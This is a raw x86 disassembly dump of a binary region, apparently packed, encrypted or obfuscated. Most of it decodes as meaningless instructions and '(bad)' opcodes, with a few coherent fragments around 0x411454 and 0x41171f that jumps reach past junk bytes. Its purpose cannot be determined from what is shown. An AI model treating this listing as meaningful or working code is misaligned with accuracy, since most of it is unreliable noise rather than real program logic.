  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x46]
  4111f1:	push   edi
  4111f2:	jno    0x4111a4
  4111f4:	out    dx,al
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	clc    
  4111fd:	jmp    0x18c7416d
  411202:	aam    0x1f
  411204:	(bad)  
  411205:	std    
  411206:	fwait
  411207:	scas   eax,DWORD PTR es:[di]
  411209:	sbb    BYTE PTR ds:[eax+0x5a865820],ah
  411210:	repz arpl cx,si
  411213:	aad    0x17
  411215:	or     bl,BYTE PTR [ebx-0x10a85a10]
  41121b:	rol    esp,1
  41121d:	cmp    eax,0xef6a48c6
  411222:	sbb    eax,0x121818d0
  411227:	ins    DWORD PTR es:[edi],dx
  411228:	js     0x41128c
  41122a:	stc    
  41122b:	cdq    
  41122c:	sahf   
  41122d:	add    eax,0x60468e3d
  411232:	(bad)  
  411233:	sti    
  411234:	cmp    eax,DWORD PTR [ecx+0x15]
  411237:	dec    esi
  411238:	dec    ecx
  411239:	dec    ebp
  41123a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41123b:	mov    ebx,0xfaab5c9f
  411240:	xchg   ah,al
  411242:	sahf   
  411243:	int3   
  411244:	mov    ebp,0x9204504f
  411249:	aas    
  41124a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41124b:	sub    esp,DWORD PTR [ebx-0x53]
  41124e:	and    eax,0xea0a5ee
  411253:	cwde   
  411254:	(bad)  
  411255:	fimul  DWORD PTR [ebp+ecx*2+0x17]
  411259:	pop    ds
  41125a:	fisubr DWORD PTR [edx+0x208c4631]
  411260:	pop    es
  411261:	mov    dl,0x58
  411263:	cmp    DWORD PTR [eax],edi
  411265:	das    
  411266:	fbld   TBYTE PTR [edi]
  411268:	es xchg ecx,eax
  41126a:	lahf   
  41126b:	pop    edx
  41126c:	loopne 0x41127f
  41126e:	jno    0x411295
  411270:	cli    
  411271:	aaa    
  411272:	xor    al,0xa4
  411274:	or     dh,bh
  411276:	push   0x74323b22
  41127b:	inc    ebp
  41127c:	mov    BYTE PTR [esi+0x1adee6ee],0x5a
  411283:	jbe    0x41124f
  411285:	add    BYTE PTR [eax+0x14],dh
  411288:	or     DWORD PTR [ecx+0x119074e5],ebx
  41128e:	xchg   edx,eax
  41128f:	(bad)  
  411290:	loop   0x411221
  411292:	aas    
  411293:	sbb    BYTE PTR [esi+0x4c],ch
  411296:	jno    0x41127d
  411298:	adc    al,0x6d
  41129a:	cs mov ah,0x81
  41129d:	push   esp
  41129e:	ret    
  41129f:	cmp    edx,DWORD PTR fs:[ebp+0x4976bdcf]
  4112a6:	in     al,0x2d
  4112a8:	sub    ah,BYTE PTR [eax+0x6cc4cc16]
  4112ae:	inc    esp
  4112af:	mov    dh,0x9b
  4112b1:	sar    DWORD PTR [eax+0x14],cl
  4112b4:	dec    esi
  4112b5:	mov    esp,0x80f08895
  4112ba:	cld    
  4112bb:	call   0xb4c9b86c
  4112c0:	inc    ebp
  4112c1:	into   
  4112c2:	jb     0x4112f1
  4112c4:	pop    edi
  4112c5:	add    BYTE PTR [ebx-0x50],cl
  4112c8:	neg    DWORD PTR [eax+0x272e23a4]
  4112ce:	pop    eax
  4112cf:	or     esi,DWORD PTR [edi]
  4112d1:	aaa    
  4112d2:	lock fadd st(5),st
  4112d5:	inc    esp
  4112d6:	adc    eax,0x686e8ee3
  4112db:	jae    0x411290
  4112dd:	std    
  4112de:	sbb    ebp,esi
  4112e0:	push   eax
  4112e1:	adc    eax,0x58280144
  4112e6:	popa   
  4112e7:	call   0x9bbedae
  4112ec:	add    dl,BYTE PTR [eax-0x27d766bc]
  4112f2:	test   BYTE PTR [ecx-0x1215dc57],dh
  4112f8:	push   0x59
  4112fa:	pop    edx
  4112fb:	pop    esp
  4112fc:	xchg   esi,eax
  4112fd:	hlt    
  4112fe:	(bad)  
  4112ff:	jle    0x411341
  411301:	arpl   WORD PTR [ebx+0x2da272],ax
  411307:	test   BYTE PTR [ecx+0x40bbde15],bl
  41130d:	inc    edx
  41130e:	shr    dh,1
  411310:	ins    DWORD PTR es:[edi],dx
  411311:	push   ds
  411312:	mov    ebx,0xf0a4167b
  411317:	push   ebp
  411318:	sub    al,0x17
  41131a:	aaa    
  41131b:	dec    eax
  41131c:	in     al,0x7
  41131e:	out    dx,eax
  41131f:	adc    edi,DWORD PTR [eax+ecx*4]
  411322:	inc    eax
  411323:	mov    BYTE PTR [ecx+0x65],bl
  411326:	rol    BYTE PTR [ebx-0xedab6b8],cl
  41132c:	mov    al,BYTE PTR [edx]
  41132e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41132f:	sbb    DWORD PTR [eax+edx*2+0x31],ecx
  411333:	ret    0xd4a5
  411336:	dec    edx
  411337:	ret    
  411338:	push   ds
  411339:	inc    esp
  41133a:	mov    edi,0xebcaa019
  41133f:	or     ebx,edx
  411341:	inc    edx
  411343:	pop    ds
  411344:	mov    eax,DWORD PTR ds:0x88b9950a
  41134a:	ror    BYTE PTR [esi-0x5db87ce2],1
  411350:	pop    ebp
  411351:	into   
  411352:	aaa    
  411353:	push   edx
  411354:	and    DWORD PTR [esi+0x21b80ae1],esi
  41135a:	push   ds
  41135b:	sahf   
  41135c:	test   al,0xc5
  41135e:	jmp    0x411375
  411360:	and    al,0x13
  411362:	pop    es
  411363:	leave  
  411364:	enter  0xb49a,0xbf
  411368:	pop    ds
  411369:	dec    eax
  41136a:	ret    
  41136b:	in     al,0x6b
  41136d:	dec    eax
  41136e:	stos   BYTE PTR es:[edi],al
  41136f:	imul   BYTE PTR [ebx+0x18]
  411372:	xor    BYTE PTR [ebp-0x191d647e],dh
  411378:	pop    ecx
  411379:	dec    edi
  41137a:	jmp    0x2d07:0x128494c8
  411381:	add    al,0x46
  411383:	or     DWORD PTR [esi+eiz*1-0x52],esp
  411387:	inc    ecx
  411388:	fiadd  DWORD PTR [ecx+eiz*8+0x656d9455]
  41138f:	adc    DWORD PTR [edi+0x74],0xffffffd3
  411393:	cwde   
  411394:	out    0xf9,eax
  411396:	jge    0x411330
  411398:	push   esi
  411399:	js     0x41140a
  41139b:	sub    al,0xac
  41139d:	lods   eax,DWORD PTR ds:[esi]
  41139e:	jb     0x41138d
  4113a0:	sub    BYTE PTR [eax],0xb1
  4113a3:	out    dx,al
  4113a4:	mov    edi,0x3d315b4a
  4113a9:	mov    ch,0xa1
  4113ab:	pop    edx
  4113ac:	lods   eax,DWORD PTR ds:[esi]
  4113ad:	out    0xa9,al
  4113af:	xor    eax,0xe88d4413
  4113b4:	and    bh,dl
  4113b6:	push   edx
  4113b7:	shl    edx,0xf2
  4113ba:	mov    edx,0x61ef62ad
  4113bf:	lock sti 
  4113c1:	cmp    esp,DWORD PTR [edx+0x46]
  4113c4:	mov    edi,0xe47a2cdf
  4113c9:	mov    WORD PTR [ebp+0x8],?
  4113cc:	jmp    0xabc06e43
  4113d1:	in     eax,0x78
  4113d3:	inc    ebp
  4113d4:	push   es
  4113d5:	aam    0xcb
  4113d7:	or     eax,DWORD PTR [eax+0x4833d58a]
  4113dd:	clc    
  4113de:	retf   0x42dd
  4113e1:	add    DWORD PTR [eax+edx*4-0x6385990e],ebp
  4113e8:	adc    DWORD PTR [ebp+0x1e],eax
  4113eb:	out    0xa1,eax
  4113ed:	push   edi
  4113ee:	dec    eax
  4113ef:	dec    edx
  4113f0:	es and dh,0x78
  4113f4:	inc    ebx
  4113f5:	sbb    eax,0x2962e5e8
  4113fa:	test   edx,esp
  4113fc:	mov    ?,WORD PTR [esi+0x40]
  4113ff:	stos   DWORD PTR es:[edi],eax
  411400:	iret   
  411401:	mov    dh,0x74
  411403:	sbb    eax,0xc8ffffb5
  411408:	cs push eax
  41140a:	aam    0xdb
  41140c:	lods   eax,DWORD PTR ds:[esi]
  41140d:	adc    al,0x3d
  41140f:	jmp    DWORD PTR [edx*8+0x52589f71]
  411416:	mov    bl,dh
  411418:	sub    edx,eax
  41141a:	arpl   WORD PTR [ebx],si
  41141c:	xor    al,0xb4
  41141e:	and    ch,bh
  411420:	mov    bh,0xa2
  411422:	loope  0x4113cd
  411424:	fld    TBYTE PTR [ebx]
  411426:	mov    ebx,0x6bd466b2
  41142b:	mov    cl,0xf8
  41142d:	xchg   BYTE PTR [edi+0x47],al
  411430:	(bad)  
  411431:	adc    eax,DWORD PTR [ebp+0x44845ab7]
  411437:	inc    edi
  411438:	gs pop eax
  41143a:	mov    BYTE PTR [edx-0x10],dh
  41143d:	cmp    eax,0x29099d10
  411442:	ss jns 0x411482
  411445:	idiv   DWORD PTR [ebx]
  411447:	or     ebp,edx
  411449:	pop    edi
  41144a:	addr16 inc ebx
  41144c:	jl     0x411410
  41144e:	(bad)  
  41144f:	push   ecx
  411450:	lods   al,BYTE PTR ds:[esi]
  411451:	adc    edx,DWORD PTR [edx]
  411453:	nop
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x227e2188]
  4114b5:	xor    DWORD PTR [ecx],esi
  4114b7:	mov    esi,0x18187847
  4114bc:	jno    0x4114d2
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	cdq    
  4114c1:	jg     0x41152d
  4114c3:	idiv   BYTE PTR [eax+0x5548e5ca]
  4114c9:	outs   dx,DWORD PTR ds:[esi]
  4114ca:	repnz aad 0x7e
  4114cd:	xor    ebx,DWORD PTR [edx-0x5c8dbf1b]
  4114d3:	data16 sbb BYTE PTR [esi],0xf
  4114d7:	lahf   
  4114d8:	push   ebp
  4114d9:	sar    BYTE PTR [ebx+0x47088fc4],0x44
  4114e0:	imul   esi,DWORD PTR ds:0x75e4bc17,0x1
  4114e7:	(bad)  
  4114e8:	jmp    0x6bd4:0x8b63c9cf
  4114ef:	mov    al,ds:0x10f04250
  4114f4:	cmp    ch,BYTE PTR [ebx+0x37]
  4114f7:	mov    eax,ds:0xc2afcd4c
  4114fc:	ds aas 
  4114fe:	cmp    eax,0x9d500dc7
  411503:	or     eax,0x97506e8c
  411508:	cmp    al,0x27
  41150a:	xor    DWORD PTR [edx+0x62],0x69ae76da
  411511:	(bad)  
  411512:	cld    
  411513:	mov    DWORD PTR [ebp+0x32256a30],ebx
  411519:	add    dl,dl
  41151b:	icebp  
  41151c:	push   eax
  41151d:	dec    eax
  41151e:	leave  
  41151f:	mov    ds:0x8e54fc9a,al
  411524:	jne    0x4114fa
  411526:	add    al,0xaa
  411528:	xor    ebp,DWORD PTR [eax-0x74754d96]
  41152e:	xor    DWORD PTR [eax],esp
  411530:	or     ch,BYTE PTR [ebx]
  411532:	jecxz  0x411560
  411534:	pop    eax
  411535:	mov    dh,0xc4
  411537:	or     ch,BYTE PTR [eax]
  411539:	or     BYTE PTR [eax+0x1f3f5990],0x79
  411540:	mov    ebx,0xa431efe3
  411545:	sub    eax,0xf2b95f47
  41154a:	mov    dh,BYTE PTR [edx]
  41154c:	or     ebp,DWORD PTR [eax-0x64a7bb5c]
  411552:	(bad)  
  411553:	jle    0x4115ba
  411555:	mov    al,ds:0x7c156361
  41155a:	arpl   WORD PTR [esi+0x5ccc1325],bx
  411560:	push   0x12
  411562:	fcmovb st,st(2)
  411564:	add    dh,BYTE PTR [eax]
  411566:	retf   
  411567:	sbb    eax,0x2eccf250
  41156c:	fs test ebx,ebp
  41156f:	dec    ebx
  411570:	scas   eax,DWORD PTR es:[edi]
  411571:	and    ebp,esp
  411573:	push   eax
  411574:	jmp    0x1cc55ae4
  411579:	int    0xc5
  41157b:	(bad)  
  41157c:	xor    eax,0x4668c4b5
  411581:	mov    ebx,0x5568a154
  411586:	arpl   WORD PTR [esi-0x743a5d9e],si
  41158c:	xor    DWORD PTR [ecx+0x55],eax
  41158f:	addr16 popa 
  411591:	xor    ebx,DWORD PTR [edx-0x14b6367b]
  411597:	or     DWORD PTR [edi],ecx
  411599:	adc    al,0x78
  41159b:	mov    WORD PTR [eax-0x525218c],?
  4115a1:	les    ebx,FWORD PTR [ebx-0x588c403c]
  4115a7:	adc    DWORD PTR [ecx+0x301d91d6],esp
  4115ad:	in     al,0x56
  4115af:	cmp    ebx,esp
  4115b1:	sub    esi,esi
  4115b3:	push   cs
  4115b4:	(bad)  
  4115b5:	out    0x49,al
  4115b7:	loopne 0x411624
  4115b9:	popw   ds
  4115bb:	aaa    
  4115bc:	mov    ch,BYTE PTR [ebx+0x6496cbe9]
  4115c2:	push   ebp
  4115c3:	test   al,0xda
  4115c5:	jg     0x4115b2
  4115c7:	(bad)  
  4115c8:	pop    ds
  4115c9:	xor    ebp,esi
  4115cb:	shr    eax,cl
  4115cd:	sti    
  4115ce:	cmp    al,0xba
  4115d0:	sub    edi,esp
  4115d2:	test   BYTE PTR [esi],bh
  4115d4:	mov    ?,WORD PTR [esi+esi*2+0x5c9ed2e8]
  4115db:	mov    ds:0xd04a5635,al
  4115e0:	adc    eax,0x9db5d7ac
  4115e5:	mov    al,0xfb
  4115e7:	ss mov bh,0xf2
  4115ea:	es xchg ecx,eax
  4115ec:	pop    ds
  4115ed:	sub    ch,bh
  4115ef:	mov    ecx,DWORD PTR [edx]
  4115f1:	fcomi  st,st(5)
  4115f3:	fs inc esp
  4115f5:	fidivr WORD PTR [ecx-0x2b0df754]
  4115fb:	mov    al,0xb5
  4115fd:	stos   BYTE PTR es:[edi],al
  4115fe:	into   
  4115ff:	mov    edi,0x565400af
  411604:	jecxz  0x41159d
  411606:	cmp    ebx,edi
  411608:	lods   al,BYTE PTR ds:[esi]
  411609:	or     BYTE PTR ds:0xbd98143a,dl
  41160f:	inc    ecx
  411610:	sbb    bl,BYTE PTR [ecx-0x63cc029c]
  411616:	sub    BYTE PTR [ecx+0x4e],bh
  411619:	dec    esp
  41161a:	cli    
  41161b:	add    DWORD PTR ds:0xe45b8c0c,ebx
  411621:	adc    dh,bh
  411623:	add    BYTE PTR [ebx-0x30],bl
  411626:	inc    ecx
  411627:	dec    eax
  411628:	rcl    DWORD PTR [esi+ecx*8-0x5],cl
  41162c:	jge    0x411693
  41162e:	je     0x411642
  411630:	(bad)  
  411631:	test   eax,0xd31278de
  411636:	aaa    
  411637:	jge    0x41160b
  411639:	rol    BYTE PTR [eax],0x24
  41163c:	add    ebx,DWORD PTR [ebx]
  41163e:	psubq  mm4,QWORD PTR [ecx+0x2f0c1449]
  411645:	in     al,dx
  411646:	pop    esi
  411647:	mov    BYTE PTR [ebx+0x48ec478f],ah
  41164d:	enter  0x4c69,0x7d
  411651:	shr    DWORD PTR [ebp-0x48],1
  411654:	jle    0x411683
  411656:	mov    edi,DWORD PTR [ebx]
  411658:	dec    edi
  411659:	push   edx
  41165a:	clc    
  41165b:	test   eax,0x1c8e4518
  411660:	jb     0x4116bc
  411662:	jb     0x4116d5
  411664:	xchg   esi,eax
  411665:	jbe    0x4115f4
  411667:	inc    ebx
  411668:	jge    0x411620
  41166a:	push   cs
  41166b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166c:	mov    al,ds:0xa9af722e
  411671:	or     eax,DWORD PTR [ebx]
  411673:	xchg   DWORD PTR [esi+0x2dbc318d],ecx
  411679:	sahf   
  41167a:	sti    
  41167b:	sti    
  41167c:	outs   dx,BYTE PTR ds:[esi]
  41167d:	aas    
  41167e:	aas    
  41167f:	inc    esp
  411680:	xor    DWORD PTR [edi],edi
  411682:	sbb    dh,cl
  411684:	lds    ecx,FWORD PTR [eax+eiz*2-0x19]
  411688:	outs   dx,BYTE PTR ds:[esi]
  411689:	popa   
  41168a:	(bad)  
  41168b:	stc    
  41168c:	pop    edi
  41168d:	inc    eax
  41168e:	cmp    al,ch
  411690:	imul   ebx,DWORD PTR [ebx-0x5f],0x78
  411694:	test   edi,ecx
  411696:	mov    eax,ds:0xa9b5b6b1
  41169b:	add    edi,DWORD PTR ds:0x3e225185
  4116a1:	push   0x14856a5e
  4116a6:	push   ds
  4116a7:	inc    ecx
  4116a8:	mov    ds:0x2feff00d,eax
  4116ad:	call   0x3e9d:0xe959594b
  4116b4:	jl     0x4116a8
  4116b6:	enter  0x8b8e,0xfd
  4116ba:	adc    esp,DWORD PTR [ebp-0x5e]
  4116bd:	addr16 inc ebx
  4116bf:	daa    
  4116c0:	lods   eax,DWORD PTR ds:[esi]
  4116c1:	dec    edi
  4116c2:	int    0x17
  4116c4:	outs   dx,BYTE PTR ds:[esi]
  4116c5:	or     BYTE PTR [ecx],bh
  4116c7:	scas   eax,DWORD PTR es:[edi]
  4116c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c9:	push   ebx
  4116ca:	inc    esp
  4116cb:	jb     0x411660
  4116cd:	fdivp  st(3),st
  4116cf:	xchg   edi,eax
  4116d0:	pop    edx
  4116d1:	cmc    
  4116d2:	inc    eax
  4116d3:	pop    ebx
  4116d4:	jp     0x411721
  4116d6:	(bad)  
  4116d7:	popf   
  4116d8:	push   ss
  4116d9:	cmc    
  4116da:	add    DWORD PTR [edi+ecx*2],esi
  4116dd:	aad    0xde
  4116df:	cwde   
  4116e0:	fstp   TBYTE PTR [esi]
  4116e2:	(bad)  
  4116e3:	pop    edi
  4116e4:	xchg   edx,eax
  4116e5:	in     al,dx
  4116e6:	jmp    0x4116fb
  4116e8:	inc    edx
  4116e9:	(bad)  
  4116ea:	pop    ds
  4116eb:	and    ebp,0xbcc26cf9
  4116f1:	xor    DWORD PTR [ecx-0x35e111a9],ebp
  4116f7:	add    cx,WORD PTR [eax+ecx*1+0x1e]
  4116fc:	xor    al,0x78
  4116fe:	jmp    0x7f23283d
  411703:	jp     0x411726
  411705:	mov    eax,es
  411707:	lea    ebx,[ebx]
  411709:	iret   
  41170a:	xchg   BYTE PTR [edi+0x1c],cl
  41170d:	pushf  
  41170e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41170f:	mov    BYTE PTR [ecx-0x75192b66],ch
  411715:	imul   esi,DWORD PTR [eax-0x3ba3842],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xef9eaa57
  411755:	sub    DWORD PTR [edx+0x1818749e],ebp
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	imul   ecx,DWORD PTR [eax+0x698e2750],0x618eb6d2
  411769:	bound  eax,QWORD PTR [edi+0x5f]
  41176c:	mov    eax,0x60dc3e7f
  411771:	outs   dx,DWORD PTR ds:[esi]
  411772:	xchg   BYTE PTR [eax],dl
  411774:	(bad)  [eax]
  411776:	adc    al,BYTE PTR [esi+0x3cf2b16f]
  41177c:	out    dx,eax
  41177d:	fisttp QWORD PTR [esi-0x5195cb9a]
  411783:	xor    BYTE PTR ds:0xac1c3e3,bh
  411789:	pop    ebx
  41178a:	mov    cl,0x35
  41178c:	mov    edx,0x8ec83e2e
  411791:	mov    dh,0x40
  411793:	mov    DWORD PTR [ebp+0x1eb41db],ebx
  411799:	daa    
  41179a:	rol    DWORD PTR [edi+0x24],1
  41179d:	jbe    0x41174c
  41179f:	pop    esi
  4117a0:	rcl    BYTE PTR [edi],1
  4117a2:	int3   
  4117a3:	(bad)  
  4117a4:	and    al,0xcf
  4117a6:	shr    BYTE PTR [eax-0x17d3b217],0xc6
  4117ad:	xchg   esp,eax
  4117ae:	and    ch,ah
  4117b0:	xchg   esi,eax
  4117b1:	pushf  
  4117b2:	add    DWORD PTR [edi],ebx
  4117b4:	pop    edi
  4117b5:	out    0x8e,al
  4117b7:	loope  0x411747
  4117b9:	xor    edi,DWORD PTR [edx]
  4117bb:	xchg   DWORD PTR [esi],ebp
  4117bd:	jmp    0x324c:0xba72dd76
  4117c4:	iret   
  4117c5:	adc    al,0x62
  4117c7:	mov    cl,0x67
  4117c9:	mov    edi,0xf80b0b83
  4117ce:	add    bl,bh
  4117d0:	xor    BYTE PTR [esi+esi*1],al
  4117d3:	xchg   esi,eax
  4117d4:	into   
  4117d5:	cwde   
  4117d6:	xor    BYTE PTR [ebx+0x57510658],dh
  4117dc:	cmp    edi,edi
  4117de:	aam    0x1d
  4117e0:	sar    DWORD PTR [eax+0x12bb157a],1
  4117e6:	in     al,0x7e
  4117e8:	test   al,0x25
  4117ea:	in     al,0xc1
  4117ec:	enter  0x6a13,0xfb
  4117f0:	hlt    
  4117f1:	(bad)  
  4117f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117f3:	gs daa 
  4117f5:	and    al,0xbd
  4117f7:	rsqrtps xmm1,XMMWORD PTR [eax+0x39ad9c34]
  4117fe:	stos   DWORD PTR es:[edi],eax
  4117ff:	into   
  411800:	ret    
  411801:	or     eax,0x309c2cd4
  411806:	fcom   DWORD PTR [esi*8-0x7898e008]
  41180d:	mov    al,BYTE PTR [ecx+0x34a55ce4]
  411813:	or     ebx,DWORD PTR [ebp-0x3d]
  411816:	inc    esp
  411817:	add    BYTE PTR [edx-0x1e5fc7a2],dl
  41181d:	loopne 0x411816
  41181f:	xor    eax,0x2a868977
  411824:	loopne 0x411896
  411826:	adc    BYTE PTR [esi],0x7e
  411829:	jmp    0x4f022be4
  41182e:	div    BYTE PTR [edi-0x37]
  411831:	cmp    al,0xfe
  411833:	sbb    eax,0x5205b41f
  411838:	out    dx,eax
  411839:	in     al,dx
  41183a:	rol    ah,0x3b
  41183d:	out    0xef,al
  41183f:	(bad)  
  411840:	shl    al,1
  411842:	fld    QWORD PTR [edx]
  411844:	mov    ah,0x95
  411846:	sbb    bh,ah
  411848:	cld    
  411849:	sbb    eax,0x27d31b6a
  41184e:	adc    ch,ch
  411850:	pop    edx
  411851:	outs   dx,BYTE PTR ds:[esi]
  411852:	mov    DWORD PTR [ebx],esp
  411854:	mov    bh,0x36
  411856:	pushf  
  411857:	push   dx
  411859:	jae    0x41183d
  41185b:	xor    eax,0xcaefa4d4
  411860:	loop   0x4118c7
  411862:	cmp    al,0x9f
  411864:	cdq    
  411865:	sti    
  411866:	jp     0x411858
  411868:	adc    BYTE PTR [edx+0x2e],bh
  41186b:	mov    al,ds:0x3533be4d
  411870:	jle    0x411834
  411872:	add    al,0x9
  411874:	mov    ds:0x38f79baf,al
  411879:	adc    al,BYTE PTR [edx+0x56]
  41187c:	or     DWORD PTR [edx+0x74],edi
  41187f:	dec    esi
  411880:	xor    BYTE PTR [edx+0x1c00ba94],bl
  411886:	sub    al,0xdc
  411888:	call   0x4ff4:0xb478d776
  41188f:	les    ebp,FWORD PTR [esi]
  411891:	into   
  411892:	xor    eax,0xe3ee779e
  411897:	add    eax,0xc545967c
  41189c:	imul   ecx,DWORD PTR [ecx+0x33feed53],0x74
  4118a3:	or     eax,0x9305b60
  4118a8:	(bad)  
  4118a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118aa:	cs pusha 
  4118ac:	adc    eax,0xab94f3e0
  4118b1:	aas    
  4118b2:	sub    al,0xf
  4118b4:	inc    esp
  4118b5:	xor    al,0xb0
  4118b7:	outs   dx,BYTE PTR ds:[esi]
  4118b8:	adc    edx,ebx
  4118ba:	bound  edx,QWORD PTR [ebx]
  4118bc:	mov    cl,0x6a
  4118be:	rcl    DWORD PTR [ebp+0x53],cl
  4118c1:	popf   
  4118c2:	push   ss
  4118c3:	jns    0x4118dd
  4118c5:	shr    BYTE PTR [eax],0xc8
  4118c8:	int3   
  4118c9:	or     al,0xe
  4118cb:	es std 
  4118cd:	sbb    al,0xe
  4118cf:	pop    es
  4118d0:	inc    ebx
  4118d1:	aad    0x3b
  4118d3:	stos   BYTE PTR es:[edi],al
  4118d4:	fisub  WORD PTR [edi+edi*1]
  4118d7:	push   ecx
  4118d8:	dec    edi
  4118d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118da:	inc    edi
  4118db:	mov    al,0xb8
  4118dd:	imul   esp,DWORD PTR [ebp-0x6f],0x28d158e0
  4118e4:	(bad)  [esi+0x4f823f56]
  4118ea:	push   ebp
  4118eb:	xchg   esp,eax
  4118ec:	inc    ecx
  4118ed:	inc    edi
  4118ee:	mov    bl,0x3f
  4118f0:	or     esp,DWORD PTR [edi+0x6c]
  4118f3:	out    dx,eax
  4118f4:	retf   
  4118f5:	daa    
  4118f6:	push   ebp
  4118f7:	inc    ebx
  4118f8:	dec    ecx
  4118f9:	je     0x4118db
  4118fb:	jg     0x411909
  4118fd:	push   0x4f
  4118ff:	pop    ecx
  411900:	jmp    0xc9ec:0x8b6762ff
  411907:	out    0xc6,eax
  411909:	(bad)  
  41190b:	js     0x411935
  41190d:	xor    eax,0xaecde932
  411912:	out    0x6c,al
  411914:	bound  ebp,QWORD PTR [esp+eax*8]
  411917:	shr    BYTE PTR [ecx+0xf],0xca
  41191b:	and    eax,0x1a59b994
  411920:	sti    
  411921:	fild   DWORD PTR [ebx]
  411923:	mov    ebp,DWORD PTR [edi+0x76e5cabc]
  411929:	and    eax,0x5c087889
  41192e:	adc    DWORD PTR [edi+0x5d],0xffffffd0
  411932:	mov    al,0x1f
  411934:	rol    BYTE PTR [edx+ebx*8+0x17d01858],0xb6
  41193c:	jnp    0x41199b
  41193e:	jno    0x4118fd
  411940:	int3   
  411941:	sbb    dl,dl
  411943:	push   edx
  411944:	pop    ebp
  411945:	mov    WORD PTR [ebx-0x20440137],gs
  41194b:	dec    esp
  41194c:	mov    al,0x68
  41194e:	shl    BYTE PTR cs:[ebx+0x69],cl
  411952:	not    bh
  411954:	or     al,0xc8
  411956:	std    
  411957:	dec    ebp
  411958:	mov    dl,0xb6
  41195a:	pop    esp
  41195b:	dec    ecx
  41195c:	repnz inc ebp
  41195e:	dec    ebp
  41195f:	out    dx,al
  411960:	or     ah,ch
  411962:	dec    edx
  411963:	lock push 0xfffffffd
  411966:	push   0xe
  411968:	push   edx
  411969:	aam    0x2
  41196b:	int3   
  41196c:	adc    al,0xd7
  41196e:	pop    edi
  41196f:	mov    ch,0x75
  411971:	mov    ds:0xdeddb578,eax
  411976:	ficom  DWORD PTR [esi+0x2eb65642]
  41197c:	(bad)  
  41197d:	aam    0x27
  41197f:	and    DWORD PTR [ecx-0x5],0xe4622574
  411986:	xor    al,0xaa
  411988:	in     al,dx
  411989:	sahf   
  41198a:	jecxz  0x411a0b
  41198c:	cld    
  41198d:	sbb    DWORD PTR [eax+0x34811fa8],ebx
  411993:	dec    ebx
  411994:	mov    bl,0x2b
  411996:	jmp    0x1039:0x6a08
  41199c:	inc    esp
  41199d:	sbb    DWORD PTR [ebx+0x0],esp
  4119a0:	call   FWORD PTR [ecx-0x4ea71cc]
  4119a6:	fdivr  DWORD PTR [ebx+ebx*2+0x7b598ef3]
  4119ad:	cmp    al,0xa0
  4119af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b0:	inc    edi
  4119b1:	sub    DWORD PTR [ebx-0x1e801438],0xffffff8b
  4119b8:	push   ebp
  4119b9:	les    eax,FWORD PTR [ecx+0xf3af1]
  4119bf:	add    BYTE PTR [ebx],cl
  4119c1:	enter  0xb8a1,0x25
  4119c5:	inc    edx
  4119c6:	add    BYTE PTR [ebx+0x1d880],cl
  4119cc:	add    BYTE PTR [ebx+0x65f68100],cl
  4119d2:	data16 add BYTE PTR [eax],al
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0xbef08f5b
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	js     0x411a19
  411a16:	imul   edi,eax,0x5b
  411a19:	add    eax,0x488e6291
  411a1e:	sbb    al,0x16
  411a20:	inc    esi
  411a21:	mov    ds:0x70c27a2b,eax
  411a26:	mov    edx,0x9da9ad77
  411a2b:	inc    eax
  411a2c:	mov    ds:0xf8d3c208,al
  411a31:	jle    0x411a94
  411a33:	xor    al,0x80
